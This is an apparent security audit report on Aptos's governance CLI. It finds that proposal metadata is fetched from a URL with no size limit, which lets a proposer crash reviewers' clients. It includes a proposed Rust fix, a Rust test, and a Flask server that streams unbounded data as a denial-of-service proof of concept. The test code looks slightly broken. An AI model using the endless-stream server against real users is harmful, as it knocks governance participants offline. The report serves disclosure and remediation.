# Audit Report

## Title
Unbounded Memory Consumption in Governance Metadata Fetching Enables Client-Side Denial of Service

## Summary
The `get_metadata_from_url()` function in the governance CLI lacks size limits when fetching proposal metadata from external URLs. An attacker with proposer stake can submit a governance proposal with a URL that serves gigabytes of data, causing memory exhaustion and denial of service for any user attempting to view the proposal. [1](#0-0) 

## Finding Description
The Aptos governance system allows proposals to reference external metadata via URLs. While the on-chain smart contract enforces a 256-character limit on the URL length, [2](#0-1)  there is no limit on the **size of the content** returned by that URL.

The vulnerability exists in the CLI's `get_metadata_from_url()` function, which uses `reqwest` to fetch metadata without any size constraints. The function calls `.bytes().await` which loads the entire HTTP response into memory.

**Attack Path:**

1. Attacker obtains minimum proposer stake and submits a governance proposal via `create_proposal_v2()` [3](#0-2) 

2. The proposal includes a `metadata_url` (under 256 characters) pointing to attacker-controlled server

3. During submission, the CLI fetches the URL to validate metadata [4](#0-3)  - attacker serves valid, small JSON initially

4. After proposal is on-chain, attacker reconfigures server to return gigabytes of data for the same URL

5. Any governance participant running `aptos governance show-proposal --proposal-id X` triggers metadata fetch [5](#0-4) 

6. The CLI attempts to load all response data into memory, exhausting available RAM and crashing

This breaks **Invariant #9 (Resource Limits)**: "All operations must respect gas, storage, and computational limits." The CLI performs unbounded memory allocation without enforcing memory constraints.

## Impact Explanation
This vulnerability enables targeted denial of service against governance participants attempting to review proposals. While it does not directly affect validator nodes or consensus, it undermines the governance review process by preventing scrutiny of proposals.

**Severity Assessment: Medium**

The impact aligns with **Medium severity** criteria as it creates operational issues requiring intervention:
- Prevents legitimate governance participants from reviewing proposal details
- Could be used to obscure malicious proposals from community review
- Requires manual intervention (users must avoid viewing the malicious proposal)
- Does not result in direct funds loss or consensus violation, but impairs governance operations

The attack requires proposer stake (significant cost barrier) and only affects CLI users, not validator infrastructure. However, undermining governance transparency is a meaningful security concern for a blockchain network.

## Likelihood Explanation
**Likelihood: Medium**

The attack is straightforward to execute but requires:
- **Proposer stake**: Attacker must hold minimum governance proposer stake (significant APT tokens)
- **Infrastructure**: Attacker needs to host a web server to serve malicious content
- **Timing**: Must change server behavior after proposal submission but before review

The attack is economically viable if the attacker benefits from reduced proposal scrutiny (e.g., to pass a malicious governance proposal). The technical complexity is low - any HTTP server can be configured to serve arbitrarily large responses.

## Recommendation
Implement size limits on metadata fetching in `get_metadata_from_url()`:

```rust
async fn get_metadata_from_url(metadata_url: &Url) -> CliTypedResult<Vec<u8>> {
    const MAX_METADATA_SIZE: usize = 1024 * 1024; // 1 MB limit
    
    let client = reqwest::ClientBuilder::default()
        .tls_built_in_root_certs(true)
        .build()
        .map_err(|err| CliError::UnexpectedError(format!("Failed to build HTTP client {}", err)))?;
    
    let response = client
        .get(metadata_url.clone())
        .send()
        .await
        .map_err(|err| {
            CliError::CommandArgumentError(format!(
                "Failed to fetch metadata url {}: {}",
                metadata_url, err
            ))
        })?;
    
    let mut bytes = Vec::new();
    let mut stream = response.bytes_stream();
    
    while let Some(chunk) = stream.next().await {
        let chunk = chunk.map_err(|err| {
            CliError::CommandArgumentError(format!(
                "Failed to fetch metadata url {}: {}",
                metadata_url, err
            ))
        })?;
        
        if bytes.len() + chunk.len() > MAX_METADATA_SIZE {
            return Err(CliError::CommandArgumentError(format!(
                "Metadata from {} exceeds maximum size of {} bytes",
                metadata_url, MAX_METADATA_SIZE
            )));
        }
        
        bytes.extend_from_slice(&chunk);
    }
    
    Ok(bytes)
}
```

Additionally, consider adding a timeout to prevent slow-read attacks:
```rust
let client = reqwest::ClientBuilder::default()
    .tls_built_in_root_certs(true)
    .timeout(std::time::Duration::from_secs(30))
    .build()
```

## Proof of Concept

```rust
#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Arc;
    use tokio::sync::Mutex;
    use warp::Filter;

    #[tokio::test]
    async fn test_unbounded_metadata_fetch() {
        // Start malicious HTTP server that sends infinite data
        let (tx, rx) = tokio::sync::oneshot::channel();
        
        tokio::spawn(async move {
            let route = warp::path("metadata.json")
                .map(|| {
                    // Return a stream that generates 10GB of data
                    let data = vec![b'X'; 10_000_000_000]; // 10GB
                    warp::reply::json(&data)
                });
            
            let (addr, server) = warp::serve(route)
                .bind_with_graceful_shutdown(([127, 0, 0, 1], 0), async {
                    rx.await.ok();
                });
            
            tx.send(addr).unwrap();
            server.await;
        });
        
        let addr = tx.await.unwrap();
        let url = Url::parse(&format!("http://{}/metadata.json", addr)).unwrap();
        
        // This will attempt to load 10GB into memory and crash
        let result = get_metadata_from_url(&url).await;
        
        // In vulnerable version, this would cause OOM
        // In fixed version, this should return an error
        assert!(result.is_err());
    }
}
```

**Manual Testing Steps:**

1. Set up malicious HTTP server:
```python
from flask import Flask, Response
app = Flask(__name__)

@app.route('/metadata.json')
def metadata():
    def generate():
        # Send 10GB of data
        while True:
            yield b'X' * 1024 * 1024  # 1MB chunks
    return Response(generate(), mimetype='application/json')

if __name__ == '__main__':
    app.run(port=8080)
```

2. Submit governance proposal with URL `http://localhost:8080/metadata.json`

3. Attempt to view proposal: `aptos governance show-proposal --proposal-id <id>`

4. Observe CLI memory consumption grows unbounded until crash

## Notes

The vulnerability is specific to the CLI tool and does not affect validator nodes or on-chain consensus. However, it represents a meaningful attack vector against governance participants. The fix should balance security (preventing DoS) with usability (allowing legitimate large metadata within reason). A 1MB limit is sufficient for typical JSON proposal metadata while preventing abuse.

### Citations

**File:** crates/aptos/src/governance/mod.rs (L118-158)
```rust
    async fn execute(mut self) -> CliTypedResult<VerifiedProposal> {
        // Get proposal
        let client = self.rest_options.client(&self.profile)?;
        let forum = client
            .get_account_resource_bcs::<VotingForum>(
                AccountAddress::ONE,
                "0x1::voting::VotingForum<0x1::governance_proposal::GovernanceProposal>",
            )
            .await?
            .into_inner();
        let voting_table = forum.table_handle.0;

        let proposal: Proposal = get_proposal(&client, voting_table, self.proposal_id)
            .await?
            .into();

        let metadata_hash = proposal.metadata.get("metadata_hash").unwrap();
        let metadata_url = proposal.metadata.get("metadata_location").unwrap();

        // Compute the hash and verify accordingly
        let mut metadata_verified = false;
        let mut actual_metadata_hash = "Unable to fetch metadata url".to_string();
        let mut actual_metadata = None;
        if let Ok(url) = Url::parse(metadata_url) {
            if let Ok(bytes) = get_metadata_from_url(&url).await {
                let hash = HashValue::sha3_256_of(&bytes);
                metadata_verified = metadata_hash == &hash.to_hex();
                actual_metadata_hash = hash.to_hex();
                if let Ok(metadata) = String::from_utf8(bytes) {
                    actual_metadata = Some(metadata);
                }
            }
        }

        Ok(VerifiedProposal {
            metadata_verified,
            actual_metadata_hash,
            actual_metadata,
            proposal,
        })
    }
```

**File:** crates/aptos/src/governance/mod.rs (L341-372)
```rust
    /// Retrieve metadata and validate it
    async fn get_metadata(&self) -> CliTypedResult<(ProposalMetadata, HashValue)> {
        #[cfg(feature = "no-upload-proposal")]
        let bytes = if let Some(ref path) = self.metadata_path {
            read_from_file(path)?
        } else {
            get_metadata_from_url(&self.metadata_url).await?
        };
        #[cfg(not(feature = "no-upload-proposal"))]
        let bytes = get_metadata_from_url(&self.metadata_url).await?;

        let metadata: ProposalMetadata = serde_json::from_slice(&bytes).map_err(|err| {
            CliError::CommandArgumentError(format!(
                "Metadata is not in a proper JSON format: {}",
                err
            ))
        })?;
        Url::parse(&metadata.source_code_url).map_err(|err| {
            CliError::CommandArgumentError(format!(
                "Source code URL {} is invalid {}",
                metadata.source_code_url, err
            ))
        })?;
        Url::parse(&metadata.discussion_url).map_err(|err| {
            CliError::CommandArgumentError(format!(
                "Discussion URL {} is invalid {}",
                metadata.discussion_url, err
            ))
        })?;
        let metadata_hash = HashValue::sha3_256_of(&bytes);
        Ok((metadata, metadata_hash))
    }
```

**File:** crates/aptos/src/governance/mod.rs (L420-445)
```rust
/// Retrieve the Metadata from the given URL
async fn get_metadata_from_url(metadata_url: &Url) -> CliTypedResult<Vec<u8>> {
    let client = reqwest::ClientBuilder::default()
        .tls_built_in_root_certs(true)
        .build()
        .map_err(|err| CliError::UnexpectedError(format!("Failed to build HTTP client {}", err)))?;
    client
        .get(metadata_url.clone())
        .send()
        .await
        .map_err(|err| {
            CliError::CommandArgumentError(format!(
                "Failed to fetch metadata url {}: {}",
                metadata_url, err
            ))
        })?
        .bytes()
        .await
        .map(|b| b.to_vec())
        .map_err(|err| {
            CliError::CommandArgumentError(format!(
                "Failed to fetch metadata url {}: {}",
                metadata_url, err
            ))
        })
}
```

**File:** aptos-move/framework/aptos-framework/sources/aptos_governance.move (L383-399)
```text
    public entry fun create_proposal_v2(
        proposer: &signer,
        stake_pool: address,
        execution_hash: vector<u8>,
        metadata_location: vector<u8>,
        metadata_hash: vector<u8>,
        is_multi_step_proposal: bool,
    ) acquires GovernanceConfig, GovernanceEvents {
        create_proposal_v2_impl(
            proposer,
            stake_pool,
            execution_hash,
            metadata_location,
            metadata_hash,
            is_multi_step_proposal
        );
    }
```

**File:** aptos-move/framework/aptos-framework/sources/aptos_governance.move (L751-762)
```text
    fun create_proposal_metadata(
        metadata_location: vector<u8>,
        metadata_hash: vector<u8>
    ): SimpleMap<String, vector<u8>> {
        assert!(string::length(&utf8(metadata_location)) <= 256, error::invalid_argument(EMETADATA_LOCATION_TOO_LONG));
        assert!(string::length(&utf8(metadata_hash)) <= 256, error::invalid_argument(EMETADATA_HASH_TOO_LONG));

        let metadata = simple_map::create<String, vector<u8>>();
        simple_map::add(&mut metadata, utf8(METADATA_LOCATION_KEY), metadata_location);
        simple_map::add(&mut metadata, utf8(METADATA_HASH_KEY), metadata_hash);
        metadata
    }
```
